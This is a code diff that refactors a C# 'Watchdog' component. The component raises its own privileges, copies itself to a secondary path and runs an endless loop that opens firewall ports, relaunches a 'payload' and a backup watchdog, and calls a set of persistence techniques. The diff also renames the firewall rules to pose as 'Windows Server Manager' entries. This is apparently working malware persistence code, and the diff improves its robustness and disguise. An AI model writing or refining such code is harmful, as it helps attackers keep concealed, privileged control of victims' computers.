@@ -1,61 +1,56 @@
-using Microsoft.Win32;
 using System.Diagnostics;
+using System.Threading;
+using Microsoft.Win32;
 
 class Watchdog
 {
-        static void Main(string[] args)
+    static void Main()
+    {
+        using var mutex = new Mutex(false, "Global\\" + Config.PrimaryWatchdogMutexName, out bool isNewInstance);
+        watchdogHelper.EnsureHighestPriv(isNewInstance);
+        RunWatchdogLoop();
+    }
+
+    private static void RunWatchdogLoop()
+    {
+        try
         {
-
-            using (Mutex mutex = new Mutex(false, "Global\\" + Config.PrimaryWatchdogMutexName, out bool isNewInstance))
-            {
-                watchdogHelper.EnsureHighestPriv(isNewInstance);
-
-                WatchdogLogic();
-            }
-        }
-    
-
-        static void WatchdogLogic()
-        {
-        
-
-        try { 
-            if (!File.Exists(Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName)))
-            {
-                File.Copy(Config.PrimaryWatchdogFullPath, Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName), overwrite: false);
-            }
+            string secondaryPath = Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName);
+            if (!File.Exists(secondaryPath))
+                File.Copy(Config.PrimaryWatchdogFullPath, secondaryPath, overwrite: false);
         }
         catch (Exception e)
         {
-            watchdogHelper.Log($"[ERROR] {e.Message}");
+            watchdogHelper.Log($"[INIT ERROR] {e.Message}");
         }
 
         while (true)
         {
-            watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
-            watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
-            watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);
+            try
+            {
+                watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
+                watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
+                watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);
 
+                foreach (int port in Config.PortsToKeepOpen)
+                    Persistence.EnsureFirewallRule((ushort)port, $"Windows Server Manager Automated Firewall Rule - {port}");
 
-            foreach(int port in Config.PortsToKeepOpen)
-            { 
-                string ruleName = "SystemEssentials" + port.ToString();
-                Persistence.EnsureFirewallRule((ushort)port, ruleName);
+                watchdogHelper.VerifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
+                watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);
+
+                watchdogHelper.VerifyFilePathsSourceAndDest(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName);
+                watchdogHelper.CheckAndRunWatchdog(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName, Config.SecondaryWatchdogMutexName);
+
+                Persistence.RunAllTechniques();
+
+                watchdogHelper.Log("Watchdog completed iteration successfully.");
+            }
+            catch (Exception ex)
+            {
+                watchdogHelper.Log($"[LOOP ERROR] {ex.Message}");
             }
 
-            watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
-            watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);
-
-            watchdogHelper.verifyFilePathsSourceAndDest(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName);
-            watchdogHelper.CheckAndRunWatchdog(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName, Config.SecondaryWatchdogMutexName);
-
-            Persistence.runAllTechniques(); 
-
-            watchdogHelper.Log("Watchdog is ran its loop");
-            Thread.Sleep(Config.sleepTime); 
+            Thread.Sleep(Config.sleepTime);
         }
-     }
-
+    }
 }
-   
-
